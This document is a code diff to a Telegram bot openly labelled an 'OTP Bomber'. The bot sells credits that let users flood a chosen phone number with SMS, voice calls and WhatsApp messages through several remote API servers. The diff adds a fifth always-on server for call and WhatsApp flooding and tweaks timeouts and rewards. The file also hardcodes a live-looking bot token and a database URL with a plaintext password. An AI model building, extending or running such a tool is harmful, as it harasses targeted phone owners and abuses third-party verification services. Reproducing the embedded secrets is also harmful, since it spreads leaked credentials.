@@ -1,5 +1,5 @@
 // ============================================================
-// bot.js – Complete OTP Bomber Bot with Load Balancing
+// bot.js – Complete OTP Bomber Bot with Load Balancing + API5
 // ============================================================
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -16,12 +16,13 @@ const express = require('express');
 const BOT_TOKEN = "8212356485:AAGeN3peo9uHPG8eCLFRuWjs12hCVC-jNs4";
 const ADMIN_IDS = [6346250222];
 
-// ===== API URLS (YOUR 4 RENDER INSTANCES) =====
+// ===== API URLS (YOUR 5 RENDER INSTANCES) =====
 const API_URLS = {
     api1: 'https://api-server-padj.onrender.com',  // API Server 1
     api2: 'https://api-server-fy8w.onrender.com',  // API Server 2
     api3: 'https://api-server-mey8.onrender.com',  // API Server 3
     api4: 'https://api-server-0abv.onrender.com'   // API Server 4
+    api5: 'https://wasataap-call-api.onrender.com'   // API Server 5 - Voice & WhatsApp Only
 };
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
@@ -319,27 +320,30 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // ============================================================
 
 let apiCycleCounter = 0;
-const API_NAMES = ['api1', 'api2', 'api3', 'api4'];
+const API_NAMES = ['api1', 'api2', 'api3', 'api4', 'api5'];
 
 function getApiForDuration(duration, cycleCount) {
-    // 1 minute: ALL APIs simultaneously for max speed
+    // API5 (Voice/WA) runs ALWAYS alongside other APIs
+    const baseApis = ['api5'];
+    
+    // 1 minute: ALL APIs + API5
     if (duration <= 1) {
-        return ['api1', 'api2', 'api3', 'api4'];
+        return ['api1', 'api2', 'api3', 'api4', 'api5'];
     }
-    // 2-5 minutes: API 1
+    // 2-5 minutes: API 1 + API5
     if (duration <= 5) {
-        return ['api1'];
+        return ['api1', 'api5'];
     }
-    // 5-10 minutes: API 2
+    // 5-10 minutes: API 2 + API5
     if (duration <= 10) {
-        return ['api2'];
+        return ['api2', 'api5'];
     }
-    // 10-60 minutes: API 3
+    // 10-60 minutes: API 3 + API5
     if (duration <= 60) {
-        return ['api3'];
+        return ['api3', 'api5'];
     }
-    // Fallback: Round-robin
-    return [API_NAMES[cycleCount % 4]];
+    // Fallback: Round-robin + API5
+    return [API_NAMES[cycleCount % 4], 'api5'];
 }
 
 // ============================================================
@@ -369,7 +373,7 @@ async function sendBombRequest(apiName, phone, duration) {
             phone,
             duration,
             instance: apiName
-        }, { timeout: 5000 });
+        }, { timeout: 10000 });
         return response.data;
     } catch (error) {
         return null;
@@ -419,7 +423,7 @@ async function runBomber(chatId, phone, durationMinutes) {
     const durationText = getDurationText(durationMinutes);
     const msg = await bot.sendMessage(
         chatId,
-        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Using distributed API network...\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
+        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Using 5 distributed API servers...\n📞 Voice/WA: API5 (Always Active)\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
         { parse_mode: 'Markdown' }
     );
 
@@ -460,19 +464,19 @@ async function runBomber(chatId, phone, durationMinutes) {
             const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
             try {
                 await bot.editMessageText(
-                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Cycles: ${cycleCount}\n🌐 API: ${apisToUse.join('+')}\n\n🔴 Use /stop to halt`,
+                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Cycles: ${cycleCount}\n🌐 API: ${apisToUse.join('+')}\n📞 Voice/WA: API5 (Always Active)\n\n🔴 Use /stop to halt`,
                     { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
                 );
             } catch (e) {}
         }
 
-        await new Promise(r => setTimeout(r, 50));
+        await new Promise(r => setTimeout(r, 100));
     }
 
     bombingStatus.set(chatId, false);
     const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
     await bot.editMessageText(
-        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use /bomb to start again`,
+        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use START BOMB to start again`,
         { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
     );
 
@@ -1058,7 +1062,8 @@ bot.on('message', async (msg) => {
             await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
             await new Promise(r => setTimeout(r, 300));
         }
-        const reward = Math.floor(Math.random() * 10) + 1;
+        // Daily reward changed from 1-10 to 1-5
+        const reward = Math.floor(Math.random() * 5) + 1;
         await updateCredits(chatId, reward);
         user.last_daily = now;
         await user.save();
@@ -1106,7 +1111,7 @@ bot.on('message', async (msg) => {
     // ===== HELP =====
     if (text === '❓ HELP') {
         bot.sendMessage(chatId, 
-            `🤖 **BOT COMMANDS & HELP**\n\n📱 **START BOMB** - Start bombing (choose duration)\n⏹️ **STOP BOMB** - Stop active bombing\n💰 **MY CREDITS** - Check your credits\n🎁 **DAILY SPIN** - Daily spin wheel\n🎟️ **REDEEM CODE** - Redeem code\n🔗 **REFERRAL** - Get referral link\n💳 **BUY CREDITS** - Buy credits\n⚙️ **SETTINGS** - Modify scanner/headers\n📊 **MY STATS** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 coins\n\n💳 **Payment:**\n• Select plan > Scan QR > Pay > Send screenshot\n• Admin will approve\n\n⭐ **Referral Bonus:** 5 credits each!`,
+            `🤖 **BOT COMMANDS & HELP**\n\n📱 **START BOMB** - Start bombing (choose duration)\n⏹️ **STOP BOMB** - Stop active bombing\n💰 **MY CREDITS** - Check your credits\n🎁 **DAILY SPIN** - Daily spin wheel (1-5 credits)\n🎟️ **REDEEM CODE** - Redeem code\n🔗 **REFERRAL** - Get referral link\n💳 **BUY CREDITS** - Buy credits\n⚙️ **SETTINGS** - Modify scanner/headers\n📊 **MY STATS** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 coins\n\n📞 **Voice/WA Calls:** Always active via API5\n\n💳 **Payment:**\n• Select plan > Scan QR > Pay > Send screenshot\n• Admin will approve\n\n⭐ **Referral Bonus:** 5 credits each!`,
             { parse_mode: 'Markdown' }
         );
         return;
@@ -1147,7 +1152,7 @@ bot.on('message', async (msg) => {
             const channels = await getChannels();
             const totalApis = 140;
             bot.sendMessage(chatId, 
-                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${totalApis}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}\n🌐 Load Balancer: ✅ Active\n🌐 API Instances: 4`,
+                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${totalApis}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}\n🌐 Load Balancer: ✅ Active\n🌐 API Instances: 5 (API5: Voice/WA)`,
                 { parse_mode: 'Markdown' }
             );
             return;
@@ -1330,7 +1335,7 @@ bot.on('message', async (msg) => {
                     [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' }]
                 ]
             };
-            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**`, 
+            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**\n\n📞 Voice/WA will run continuously via API5`, 
                 { parse_mode: 'Markdown', reply_markup: keyboard });
             return;
         }
@@ -1699,7 +1704,8 @@ app.get('/health', (req, res) => {
         qrCodeSet: qrCodeSet,
         pendingPayments: pendingScreenshots.size,
         loadBalancer: 'Active',
-        apiInstances: Object.keys(API_URLS).length
+        apiInstances: Object.keys(API_URLS).length,
+        api5Type: 'Voice & WhatsApp Only'
     });
 });
 
@@ -1710,14 +1716,14 @@ app.listen(PORT, '0.0.0.0', () => {
 
 console.log('🤖 Bot started successfully!');
 console.log(`📡 Load Balancer: ACTIVE`);
-console.log(`🌐 API Instances: 4`);
+console.log(`🌐 API Instances: 5`);
+console.log(`   API1-4: All APIs`);
+console.log(`   API5: Voice & WhatsApp Only (Always Active)`);
+console.log(`🎁 Daily Spin: 1-5 credits`);
 console.log(`📸 QR Code payment system: ${qrCodeSet ? '✅' : '❌'}`);
 console.log(`💳 Screenshot approval system: ✅`);
 console.log(`📢 Broadcast system: ✅`);
 console.log(`🔗 Referral system: ✅`);
-console.log(`🎁 Daily spin: ✅`);
 console.log(`👑 Admin panel: ✅`);
 console.log(`🛡️ Protected numbers: ✅`);
 console.log(`📺 Channel verification: ✅`);
-console.log(`⚙️ Settings: ✅`);
-console.log(`📊 Stats: ✅`);
